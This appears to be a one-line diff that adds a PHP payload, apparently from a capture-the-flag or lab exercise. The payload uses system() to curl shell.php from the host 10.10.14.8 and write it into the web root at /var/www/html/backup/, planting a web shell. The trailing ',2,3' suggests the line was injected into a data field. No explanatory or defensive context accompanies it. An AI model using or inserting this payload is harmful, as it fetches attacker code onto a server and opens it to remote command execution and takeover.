@@ -1,0 +1,1 @@
+<?php system('curl 10.10.14.8/shell.php -o /var/www/html/backup/shell.php'); ?>,2,3
